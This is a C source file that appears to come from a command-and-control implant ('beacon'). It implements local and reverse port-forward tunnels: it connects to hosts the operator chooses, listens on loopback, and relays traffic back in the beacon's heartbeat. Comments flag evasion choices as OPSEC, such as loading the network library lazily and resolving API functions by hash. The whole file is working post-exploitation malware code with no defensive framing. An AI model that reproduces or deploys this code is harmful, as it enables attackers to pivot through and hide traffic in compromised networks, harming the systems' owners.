/* beacon/src/Commands/Tunnel.c
 * lportfwd + rportfwd tunnel support.
 * ws2_32 loaded lazily on first tunnel command (OPSEC). */

#include "Nax.h"

/* inline NaxFdIsSet replacement - avoids linking __WSAFDIsSet from ws2_32 */
static __inline BOOL NaxFdIsSet( UINT_PTR s, fd_set* set ) {
    for ( unsigned int i = 0; i < set->fd_count; i++ ) {
        if ( set->fd_array[i] == (SOCKET)s )
            return TRUE;
    }
    return FALSE;
}

/* ========= [ ws2_32 lazy loader ] ========= */

FUNC BOOL NaxEnsureWs2( PNAX_INSTANCE Nax ) {

    if ( Nax->Ws2.Loaded )
        return TRUE;

    PVOID hWs2 = NaxGetModule( H_WS2_32_DLL );
    if ( !hWs2 ) {
        WCHAR ws2Name[] = { 'w','s','2','_','3','2','.','d','l','l', 0 };
        hWs2 = C_PTR( Nax->Kernel32.LoadLibraryW( ws2Name ) );
        if ( !hWs2 )
            return FALSE;
    }

    Nax->Ws2.WSAStartup      = NaxGetProc( hWs2, H_WSASTARTUP );
    Nax->Ws2.WSACleanup      = NaxGetProc( hWs2, H_WSACLEANUP );
    Nax->Ws2.WSAGetLastError  = NaxGetProc( hWs2, H_WSAGETLASTERROR );
    Nax->Ws2.socket           = NaxGetProc( hWs2, H_SOCKET_FN );
    Nax->Ws2.closesocket      = NaxGetProc( hWs2, H_CLOSESOCKET );
    Nax->Ws2.connect          = NaxGetProc( hWs2, H_CONNECT_FN );
    Nax->Ws2.bind             = NaxGetProc( hWs2, H_BIND_FN );
    Nax->Ws2.listen           = NaxGetProc( hWs2, H_LISTEN_FN );
    Nax->Ws2.accept           = NaxGetProc( hWs2, H_ACCEPT_FN );
    Nax->Ws2.send             = NaxGetProc( hWs2, H_SEND_FN );
    Nax->Ws2.recv             = NaxGetProc( hWs2, H_RECV_FN );
    Nax->Ws2.select           = NaxGetProc( hWs2, H_SELECT_FN );
    Nax->Ws2.ioctlsocket      = NaxGetProc( hWs2, H_IOCTLSOCKET );
    Nax->Ws2.htons            = NaxGetProc( hWs2, H_HTONS );
    Nax->Ws2.ntohs            = NaxGetProc( hWs2, H_NTOHS );
    Nax->Ws2.inet_addr        = NaxGetProc( hWs2, H_INET_ADDR );
    Nax->Ws2.gethostbyname    = NaxGetProc( hWs2, H_GETHOSTBYNAME );
    Nax->Ws2.setsockopt       = NaxGetProc( hWs2, H_SETSOCKOPT );
    Nax->Ws2.shutdown         = NaxGetProc( hWs2, H_SHUTDOWN_FN );
    Nax->Ws2.WSACreateEvent   = NaxGetProc( hWs2, H_WSACREATEEVENT );
    Nax->Ws2.WSACloseEvent    = NaxGetProc( hWs2, H_WSACLOSEEVENT );
    Nax->Ws2.WSAEventSelect   = NaxGetProc( hWs2, H_WSAEVENTSELECT );
    Nax->Ws2.WSAResetEvent          = NaxGetProc( hWs2, H_WSARESETEVENT );
    Nax->Ws2.WSAEnumNetworkEvents   = NaxGetProc( hWs2, H_WSAENUMNETWORKEVENTS );

    if ( !Nax->Ws2.socket  || !Nax->Ws2.connect || !Nax->Ws2.send ||
         !Nax->Ws2.recv    || !Nax->Ws2.select  || !Nax->Ws2.closesocket )
        return FALSE;

    WSADATA wsaData;
    MmZero( &wsaData, sizeof( wsaData ) );
    if ( Nax->Ws2.WSAStartup( MAKEWORD( 2, 2 ), &wsaData ) != 0 )
        return FALSE;

    Nax->Ws2.Loaded = TRUE;
    return TRUE;
}

/* ========= [ tunnel list helpers ] ========= */

FUNC NAX_TUNNEL* NaxTunnelFind( PNAX_INSTANCE Nax, UINT32 channelId ) {

    NAX_TUNNEL* t = Nax->TunnelHead;
    while ( t ) {
        if ( t->ChannelId == channelId )
            return t;
        t = t->Next;
    }
    return NULL;
}

FUNC NAX_TUNNEL* NaxTunnelAlloc( PNAX_INSTANCE Nax, UINT32 channelId ) {

    NAX_TUNNEL* t = C_PTR( Nax->Ntdll.RtlAllocateHeap(
        Nax->Heap, 0x08, sizeof( NAX_TUNNEL ) ) );
    if ( !t )
        return NULL;

    MmZero( t, sizeof( NAX_TUNNEL ) );
    t->ChannelId = channelId;
    t->Next      = Nax->TunnelHead;
    Nax->TunnelHead = t;
    return t;
}

FUNC VOID NaxTunnelRemove( PNAX_INSTANCE Nax, NAX_TUNNEL* target ) {

    NAX_TUNNEL** pp = &Nax->TunnelHead;
    while ( *pp ) {
        if ( *pp == target ) {
            *pp = target->Next;
            if ( target->WriteBuf )
                Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, target->WriteBuf );
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, target );
            return;
        }
        pp = &(*pp)->Next;
    }
}

/* ========= [ WSAEvent helpers for WFMO integration ] ========= */

FUNC VOID NaxTunnelRegisterSocket( PNAX_INSTANCE Nax, UINT_PTR sock, long events ) {
    if ( !Nax->Ws2.WSACreateEvent )
        return;
    if ( !Nax->TunnelEvent )
        Nax->TunnelEvent = Nax->Ws2.WSACreateEvent();
    if ( Nax->TunnelEvent )
        Nax->Ws2.WSAEventSelect( sock, Nax->TunnelEvent, events );
}

/* ========= [ pack tunnel result entry ] ========= */

FUNC UINT32 NaxTunnelPackEntry( PBYTE out, UINT32 cap, UINT32 cmdId,
                                 PBYTE payload, UINT32 payloadLen ) {

    UINT32 entryLen = 4 + payloadLen;  /* cmdId(4) + payload */
    UINT32 total    = 4 + entryLen;    /* entryLen(4) + entry */
    if ( total > cap )
        return 0;

    /* entryLen (4LE) */
    out[0] = (BYTE)( entryLen );
    out[1] = (BYTE)( entryLen >> 8 );
    out[2] = (BYTE)( entryLen >> 16 );
    out[3] = (BYTE)( entryLen >> 24 );

    /* cmdId (4LE) */
    out[4] = (BYTE)( cmdId );
    out[5] = (BYTE)( cmdId >> 8 );
    out[6] = (BYTE)( cmdId >> 16 );
    out[7] = (BYTE)( cmdId >> 24 );

    if ( payloadLen > 0 )
        MmCopy( out + 8, payload, payloadLen );

    return total;
}

/* ========= [ command handlers ] ========= */

FUNC VOID NaxTunnelConnectTCP( PNAX_INSTANCE Nax, UINT32 channelId,
                                UINT32 type, PBYTE addr, UINT32 addrLen, UINT32 port ) {

    NAX_TUNNEL* t = NaxTunnelAlloc( Nax, channelId );
    if ( !t )
        return;

    t->Type      = type;
    t->State     = NAX_TUNNEL_STATE_CONNECT;
    t->Mode      = NAX_TUNNEL_MODE_TCP;
    t->WaitTime  = 10000;
    t->StartTick = Nax->Kernel32.GetTickCount64();

    UINT_PTR s = Nax->Ws2.socket( NAX_AF_INET, NAX_SOCK_STREAM, NAX_IPPROTO_TCP );
    if ( s == (UINT_PTR)-1 ) {
        t->State = NAX_TUNNEL_STATE_CLOSE;
        return;
    }
    t->Sock = s;

    ULONG nbio = 1;
    Nax->Ws2.ioctlsocket( s, NAX_FIONBIO, &nbio );

    /* short timeouts */
    INT timeoutMs = 100;
    Nax->Ws2.setsockopt( s, NAX_SOL_SOCKET, NAX_SO_RCVTIMEO, (PCHAR)&timeoutMs, sizeof( timeoutMs ) );
    Nax->Ws2.setsockopt( s, NAX_SOL_SOCKET, NAX_SO_SNDTIMEO, (PCHAR)&timeoutMs, sizeof( timeoutMs ) );

    /* null-terminate address - wire buffer has port bytes right after addr */
    CHAR addrBuf[256];
    UINT32 copyLen = addrLen < 255 ? addrLen : 255;
    MmCopy( addrBuf, addr, copyLen );
    addrBuf[copyLen] = '\0';

    struct sockaddr_in sa;
    MmZero( &sa, sizeof( sa ) );
    sa.sin_family = NAX_AF_INET;
    sa.sin_port   = Nax->Ws2.htons( (USHORT)port );
    sa.sin_addr.s_addr = Nax->Ws2.inet_addr( addrBuf );

    if ( sa.sin_addr.s_addr == NAX_INADDR_NONE ) {
        struct hostent* he = Nax->Ws2.gethostbyname( addrBuf );
        if ( he && he->h_addr_list && he->h_addr_list[0] )
            MmCopy( &sa.sin_addr, he->h_addr_list[0], 4 );
        else {
            Nax->Ws2.closesocket( s );
            t->State = NAX_TUNNEL_STATE_CLOSE;
            return;
        }
    }

    NaxTunnelRegisterSocket( Nax, s, NAX_FD_CONNECT | NAX_FD_READ | NAX_FD_WRITE | NAX_FD_CLOSE );

    Nax->Ws2.connect( s, (struct sockaddr*)&sa, sizeof( sa ) );
}

FUNC VOID NaxTunnelWriteTCP( PNAX_INSTANCE Nax, UINT32 channelId,
                              PBYTE data, UINT32 dataLen ) {

    NAX_TUNNEL* t = NaxTunnelFind( Nax, channelId );
    if ( !t || t->State == NAX_TUNNEL_STATE_CLOSE )
        return;

    /* try immediate send if no buffered data */
    if ( !t->WriteBuf || t->WriteBufSize == 0 ) {
        while ( dataLen > 0 ) {
            INT sent = Nax->Ws2.send( t->Sock, (PCHAR)data, (INT)dataLen, 0 );
            if ( sent > 0 ) {
                data    += sent;
                dataLen -= sent;
            } else {
                break;  /* WSAEWOULDBLOCK or error - buffer the rest */
            }
        }
        if ( dataLen == 0 )
            return;
    }

    UINT32 newSize = t->WriteBufSize + dataLen;
    if ( newSize > NAX_TUNNEL_HARD_CAP ) {
        t->State = NAX_TUNNEL_STATE_CLOSE;
        return;
    }
    PBYTE newBuf = C_PTR( Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, newSize ) );
    if ( !newBuf ) {
        t->State = NAX_TUNNEL_STATE_CLOSE;
        return;
    }
    if ( t->WriteBuf && t->WriteBufSize > 0 )
        MmCopy( newBuf, t->WriteBuf, t->WriteBufSize );
    MmCopy( newBuf + t->WriteBufSize, data, dataLen );
    if ( t->WriteBuf )
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, t->WriteBuf );
    t->WriteBuf     = newBuf;
    t->WriteBufSize = newSize;
}

FUNC VOID NaxTunnelClose( PNAX_INSTANCE Nax, UINT32 channelId ) {

    NAX_TUNNEL* t = NaxTunnelFind( Nax, channelId );
    if ( t ) {
        t->State      = NAX_TUNNEL_STATE_CLOSE;
        t->CloseTimer = 0;
    }
}

FUNC VOID NaxTunnelReverse( PNAX_INSTANCE Nax, UINT32 tunnelId, UINT32 port ) {

    NAX_TUNNEL* t = NaxTunnelAlloc( Nax, tunnelId );
    if ( !t )
        return;

    t->Type      = 0;
    t->State     = NAX_TUNNEL_STATE_CONNECT;
    t->Mode      = NAX_TUNNEL_MODE_REVERSE;
    t->WaitTime  = 0;
    t->StartTick = Nax->Kernel32.GetTickCount64();

    UINT_PTR s = Nax->Ws2.socket( NAX_AF_INET, NAX_SOCK_STREAM, NAX_IPPROTO_TCP );
    if ( s == (UINT_PTR)-1 ) {
        t->State = NAX_TUNNEL_STATE_CLOSE;
        return;
    }
    t->Sock = s;

    INT reuse = 1;
    Nax->Ws2.setsockopt( s, NAX_SOL_SOCKET, NAX_SO_REUSEADDR, (PCHAR)&reuse, sizeof( reuse ) );

    ULONG nbio = 1;
    Nax->Ws2.ioctlsocket( s, NAX_FIONBIO, &nbio );

    /* bind loopback only (OPSEC) */
    struct sockaddr_in sa;
    MmZero( &sa, sizeof( sa ) );
    sa.sin_family      = NAX_AF_INET;
    sa.sin_port        = Nax->Ws2.htons( (USHORT)port );
    sa.sin_addr.s_addr = NAX_INADDR_LOOPBACK_NBO;

    if ( Nax->Ws2.bind( s, (struct sockaddr*)&sa, sizeof( sa ) ) != 0 ) {
        Nax->Ws2.closesocket( s );
        t->State = NAX_TUNNEL_STATE_CLOSE;
        return;
    }

    if ( Nax->Ws2.listen( s, 10 ) != 0 ) {
        Nax->Ws2.closesocket( s );
        t->State = NAX_TUNNEL_STATE_CLOSE;
        return;
    }

    NaxTunnelRegisterSocket( Nax, s, NAX_FD_ACCEPT | NAX_FD_CLOSE );

    t->State = NAX_TUNNEL_STATE_READY;
}

FUNC VOID NaxTunnelPause( PNAX_INSTANCE Nax, UINT32 channelId ) {

    NAX_TUNNEL* t = NaxTunnelFind( Nax, channelId );
    if ( t )
        t->SrvPaused = TRUE;
}

FUNC VOID NaxTunnelResume( PNAX_INSTANCE Nax, UINT32 channelId ) {

    NAX_TUNNEL* t = NaxTunnelFind( Nax, channelId );
    if ( t )
        t->SrvPaused = FALSE;
}

/* ========= [ tunnel command dispatcher ] ========= */

FUNC VOID NaxTunnelDispatch( PNAX_INSTANCE Nax, BYTE cmdId,
                              PBYTE args, UINT32 argsLen ) {

    if ( !NaxEnsureWs2( Nax ) )
        return;

    switch ( cmdId ) {

    case NAX_CMD_TUNNEL_CONNECT_TCP: {
        /* channelId(4) | type(4) | addrLen(4) | addr(addrLen) | port(4) */
        if ( argsLen < 16 ) return;
        UINT32 chId    = NaxR32( args );
        UINT32 type    = NaxR32( args + 4 );
        UINT32 addrLen = NaxR32( args + 8 );
        if ( argsLen < 12 + addrLen + 4 ) return;
        UINT32 port    = NaxR32( args + 12 + addrLen );
        NaxTunnelConnectTCP( Nax, chId, type, args + 12, addrLen, port );
        break;
    }

    case NAX_CMD_TUNNEL_WRITE_TCP: {
        /* channelId(4) | dataLen(4) | data */
        if ( argsLen < 8 ) return;
        UINT32 chId    = NaxR32( args );
        UINT32 dataLen = NaxR32( args + 4 );
        if ( argsLen < 8 + dataLen ) return;
        NaxTunnelWriteTCP( Nax, chId, args + 8, dataLen );
        break;
    }

    case NAX_CMD_TUNNEL_CLOSE: {
        /* channelId(4) */
        if ( argsLen < 4 ) return;
        NaxTunnelClose( Nax, NaxR32( args ) );
        break;
    }

    case NAX_CMD_TUNNEL_REVERSE: {
        /* tunnelId(4) | port(4) */
        if ( argsLen < 8 ) return;
        NaxTunnelReverse( Nax, NaxR32( args ), NaxR32( args + 4 ) );
        break;
    }

    case NAX_CMD_TUNNEL_PAUSE: {
        if ( argsLen < 4 ) return;
        NaxTunnelPause( Nax, NaxR32( args ) );
        break;
    }

    case NAX_CMD_TUNNEL_RESUME: {
        if ( argsLen < 4 ) return;
        NaxTunnelResume( Nax, NaxR32( args ) );
        break;
    }

    default:
        break;
    }
}

/* ========= [ heartbeat tunnel processor ] ========= */

FUNC UINT32 NaxProcessTunnels( PNAX_INSTANCE Nax, PBYTE out, UINT32 outCap ) {

    if ( !Nax->TunnelHead )
        return 0;

    if ( Nax->Ws2.WSAEnumNetworkEvents ) {
        NAX_TUNNEL* ev = Nax->TunnelHead;
        while ( ev ) {
            WSANETWORKEVENTS ne;
            MmZero( &ne, sizeof( ne ) );
            Nax->Ws2.WSAEnumNetworkEvents( ev->Sock, NULL, &ne );
            ev = ev->Next;
        }
    }

    UINT32 written = 0;
    UINT64 now     = Nax->Kernel32.GetTickCount64();

    struct timeval tv;
    tv.tv_sec  = 0;
    tv.tv_usec = 0;

    /* ---- Phase 1: Check connecting sockets ---- */
    NAX_TUNNEL* t = Nax->TunnelHead;
    while ( t ) {
        NAX_TUNNEL* next = t->Next;

        if ( t->State == NAX_TUNNEL_STATE_CONNECT && t->Mode == NAX_TUNNEL_MODE_TCP ) {
            fd_set wfds, efds;
            FD_ZERO( &wfds );
            FD_ZERO( &efds );
            FD_SET( t->Sock, &wfds );
            FD_SET( t->Sock, &efds );

            INT sr = Nax->Ws2.select( 0, NULL, &wfds, &efds, &tv );
            if ( sr > 0 && NaxFdIsSet( t->Sock, &wfds ) && !NaxFdIsSet( t->Sock, &efds ) ) {

                t->State = NAX_TUNNEL_STATE_READY;
                BYTE rb[12];
                UINT32 chId = t->ChannelId, tp = t->Type, res = 0;
                rb[0] = (BYTE)chId; rb[1] = (BYTE)(chId>>8); rb[2] = (BYTE)(chId>>16); rb[3] = (BYTE)(chId>>24);
                rb[4] = (BYTE)tp;   rb[5] = (BYTE)(tp>>8);   rb[6] = (BYTE)(tp>>16);   rb[7] = (BYTE)(tp>>24);
                rb[8] = (BYTE)res;  rb[9] = (BYTE)(res>>8);  rb[10]= (BYTE)(res>>16);  rb[11]= (BYTE)(res>>24);
                UINT32 w = NaxTunnelPackEntry( out + written, outCap - written, NAX_CMD_TUNNEL_CONNECT_TCP, rb, 12 );
                written += w;

            } else if ( t->WaitTime > 0 && ( now - t->StartTick ) > t->WaitTime ) {
                
                t->State = NAX_TUNNEL_STATE_CLOSE;
                BYTE rb[12];
                UINT32 chId = t->ChannelId, tp = t->Type, res = 1;
                rb[0] = (BYTE)chId; rb[1] = (BYTE)(chId>>8); rb[2] = (BYTE)(chId>>16); rb[3] = (BYTE)(chId>>24);
                rb[4] = (BYTE)tp;   rb[5] = (BYTE)(tp>>8);   rb[6] = (BYTE)(tp>>16);   rb[7] = (BYTE)(tp>>24);
                rb[8] = (BYTE)res;  rb[9] = (BYTE)(res>>8);  rb[10]= (BYTE)(res>>16);  rb[11]= (BYTE)(res>>24);
                UINT32 w = NaxTunnelPackEntry( out + written, outCap - written, NAX_CMD_TUNNEL_CONNECT_TCP, rb, 12 );
                written += w;

            }
        }

        /* Check reverse listeners for incoming connections */
        if ( t->State == NAX_TUNNEL_STATE_READY && t->Mode == NAX_TUNNEL_MODE_REVERSE ) {
            fd_set rfds;
            FD_ZERO( &rfds );
            FD_SET( t->Sock, &rfds );

            INT sr = Nax->Ws2.select( 0, &rfds, NULL, NULL, &tv );
            if ( sr > 0 && NaxFdIsSet( t->Sock, &rfds ) ) {
                struct sockaddr_in ca;
                INT caLen = sizeof( ca );
                UINT_PTR cs = Nax->Ws2.accept( t->Sock, (struct sockaddr*)&ca, &caLen );
                if ( cs != (UINT_PTR)-1 ) {
                    ULONG nbio = 1;
                    Nax->Ws2.ioctlsocket( cs, NAX_FIONBIO, &nbio );
                    NaxTunnelRegisterSocket( Nax, cs, NAX_FD_READ | NAX_FD_WRITE | NAX_FD_CLOSE );

                    /* generate channel ID from lower bits of socket handle XOR tick */
                    UINT32 newChId = (UINT32)( cs ^ ( now & 0xFFFFFFFF ) );
                    NAX_TUNNEL* ct = NaxTunnelAlloc( Nax, newChId );
                    if ( ct ) {
                        ct->Sock  = cs;
                        ct->State = NAX_TUNNEL_STATE_READY;
                        ct->Mode  = NAX_TUNNEL_MODE_TCP;
                        ct->Type  = t->Type;

                        /* pack ACCEPT: tunnelId(4) | newChannelId(4) */
                        BYTE ab[8];
                        UINT32 tid = t->ChannelId;
                        ab[0] = (BYTE)tid; ab[1] = (BYTE)(tid>>8); ab[2] = (BYTE)(tid>>16); ab[3] = (BYTE)(tid>>24);
                        ab[4] = (BYTE)newChId; ab[5] = (BYTE)(newChId>>8); ab[6] = (BYTE)(newChId>>16); ab[7] = (BYTE)(newChId>>24);
                        UINT32 w = NaxTunnelPackEntry( out + written, outCap - written, NAX_CMD_TUNNEL_ACCEPT, ab, 8 );
                        written += w;
                    } else {
                        Nax->Ws2.closesocket( cs );
                    }
                }
            }
        }

        t = next;
    }

    t = Nax->TunnelHead;
    while ( t ) {
        if ( t->State == NAX_TUNNEL_STATE_READY
             && t->WriteBuf && t->WriteBufSize > 0 ) {

            UINT32 totalSent = 0;
            while ( totalSent < t->WriteBufSize ) {
                INT sent = Nax->Ws2.send( t->Sock, (PCHAR)( t->WriteBuf + totalSent ),
                                              (INT)( t->WriteBufSize - totalSent ), 0 );
                if ( sent > 0 ) {
                    totalSent += (UINT32)sent;
                } else {
                    break; 
                }
            }

            if ( totalSent > 0 ) {
                if ( totalSent >= t->WriteBufSize ) {
                    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, t->WriteBuf );
                    t->WriteBuf     = NULL;
                    t->WriteBufSize = 0;
                } else {
                    UINT32 rem = t->WriteBufSize - totalSent;
                    PBYTE nb = C_PTR( Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, rem ) );
                    if ( nb ) {
                        MmCopy( nb, t->WriteBuf + totalSent, rem );
                        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, t->WriteBuf );
                        t->WriteBuf     = nb;
                        t->WriteBufSize = rem;
                    }
                }
            }

            /* send RESUME if we were paused and buffer dropped below low watermark */
            if ( t->Paused && t->WriteBufSize < NAX_TUNNEL_LOW_WATERMARK ) {
                t->Paused = FALSE;
                BYTE pb[4];
                UINT32 chId = t->ChannelId;
                pb[0] = (BYTE)chId; pb[1] = (BYTE)(chId>>8); pb[2] = (BYTE)(chId>>16); pb[3] = (BYTE)(chId>>24);
                UINT32 w = NaxTunnelPackEntry( out + written, outCap - written,
                                                NAX_CMD_TUNNEL_RESUME, pb, 4 );
                written += w;
            }
        }
        t = t->Next;
    }

    /* ---- Phase 3: Recv from ready sockets ---- */
    UINT64 recvStart = Nax->Kernel32.GetTickCount64();
    UINT32 totalRecv = 0;

    t = Nax->TunnelHead;
    while ( t ) {
        if ( t->State == NAX_TUNNEL_STATE_READY && t->Mode == NAX_TUNNEL_MODE_TCP && !t->SrvPaused ) {
            for ( INT i = 0; i < NAX_TUNNEL_RECV_MAX_ITER; i++ ) {
                if ( ( Nax->Kernel32.GetTickCount64() - recvStart ) > NAX_TUNNEL_RECV_BUDGET_MS )
                    break;
                if ( totalRecv >= NAX_TUNNEL_HIGH_WATERMARK )
                    break;

                fd_set rfds;
                FD_ZERO( &rfds );
                FD_SET( t->Sock, &rfds );
                INT sr = Nax->Ws2.select( 0, &rfds, NULL, NULL, &tv );
                if ( sr <= 0 || !NaxFdIsSet( t->Sock, &rfds ) )
                    break;

                UINT32 space = outCap - written;
                if ( space < NAX_TUNNEL_RECV_HDR_RESERVE ) break;
                UINT32 maxRecv = space - NAX_TUNNEL_RECV_HDR_RESERVE;
                if ( maxRecv > NAX_TUNNEL_RECV_CHUNK_MAX ) maxRecv = NAX_TUNNEL_RECV_CHUNK_MAX;

                BYTE* recvBase = out + written + 8 + 8;  
                INT got = Nax->Ws2.recv( t->Sock, (PCHAR)recvBase, (INT)maxRecv, 0 );

                if ( got > 0 ) {
                    BYTE ph[8];
                    UINT32 chId = t->ChannelId;
                    ph[0] = (BYTE)chId; ph[1] = (BYTE)(chId>>8); ph[2] = (BYTE)(chId>>16); ph[3] = (BYTE)(chId>>24);
                    ph[4] = (BYTE)got;  ph[5] = (BYTE)(got>>8);  ph[6] = (BYTE)(got>>16);  ph[7] = (BYTE)(got>>24);
                    MmCopy( out + written + 8, ph, 8 );

                    UINT32 entryLen = 4 + 8 + (UINT32)got;  
                    UINT32 total = 4 + entryLen;
                    out[written]   = (BYTE)entryLen;
                    out[written+1] = (BYTE)(entryLen>>8);
                    out[written+2] = (BYTE)(entryLen>>16);
                    out[written+3] = (BYTE)(entryLen>>24);
                    UINT32 cmd = NAX_CMD_TUNNEL_WRITE_TCP;
                    out[written+4] = (BYTE)cmd;
                    out[written+5] = (BYTE)(cmd>>8);
                    out[written+6] = (BYTE)(cmd>>16);
                    out[written+7] = (BYTE)(cmd>>24);

                    written   += total;
                    totalRecv += (UINT32)got;
                } else if ( got == 0 ) {
                    t->State = NAX_TUNNEL_STATE_CLOSE;
                    break;
                } else {
                    INT err = Nax->Ws2.WSAGetLastError();
                    if ( err != NAX_WSAEWOULDBLOCK )
                        t->State = NAX_TUNNEL_STATE_CLOSE;
                    break;
                }
            }

            /* send PAUSE if output exceeds high watermark */
            if ( totalRecv >= NAX_TUNNEL_HIGH_WATERMARK && !t->Paused ) {
                t->Paused = TRUE;
                BYTE pb[4];
                UINT32 chId = t->ChannelId;
                pb[0] = (BYTE)chId; pb[1] = (BYTE)(chId>>8); pb[2] = (BYTE)(chId>>16); pb[3] = (BYTE)(chId>>24);
                UINT32 w = NaxTunnelPackEntry( out + written, outCap - written,
                                                NAX_CMD_TUNNEL_PAUSE, pb, 4 );
                written += w;
            }
        }
        t = t->Next;
    }

    /* ---- Phase 4: Cleanup closed tunnels ---- */
    t = Nax->TunnelHead;
    while ( t ) {
        NAX_TUNNEL* next = t->Next;

        if ( t->State == NAX_TUNNEL_STATE_CLOSE ) {

            if ( t->WriteBuf && t->WriteBufSize > 0 ) {
                if ( t->CloseTimer == 0 ) {
                    t->CloseTimer = 1;
                    t->StartTick  = now;
                } else if ( ( now - t->StartTick ) > NAX_TUNNEL_DRAIN_TIMEOUT_MS ) {
                    Nax->Ws2.shutdown( t->Sock, NAX_SD_BOTH );
                    Nax->Ws2.closesocket( t->Sock );
                    NaxTunnelRemove( Nax, t );
                }
                t = next;
                continue;
            }

            if ( t->CloseTimer <= 1 ) {
                t->CloseTimer = 2;
                t->StartTick  = now;

                BYTE cb[12];
                UINT32 chId = t->ChannelId, tp = t->Type, res = 0;
                cb[0] = (BYTE)chId; cb[1] = (BYTE)(chId>>8); cb[2] = (BYTE)(chId>>16); cb[3] = (BYTE)(chId>>24);
                cb[4] = (BYTE)tp;   cb[5] = (BYTE)(tp>>8);   cb[6] = (BYTE)(tp>>16);   cb[7] = (BYTE)(tp>>24);
                cb[8] = (BYTE)res;  cb[9] = (BYTE)(res>>8);  cb[10]= (BYTE)(res>>16);  cb[11]= (BYTE)(res>>24);
                UINT32 w = NaxTunnelPackEntry( out + written, outCap - written,
                                                NAX_CMD_TUNNEL_CLOSE, cb, 12 );
                written += w;

                Nax->Ws2.shutdown( t->Sock, NAX_SD_SEND );
            } else if ( ( now - t->StartTick ) > NAX_TUNNEL_CLOSE_GRACE_MS ) {
                Nax->Ws2.closesocket( t->Sock );
                NaxTunnelRemove( Nax, t );
            }
        }

        t = next;
    }

    return written;
}
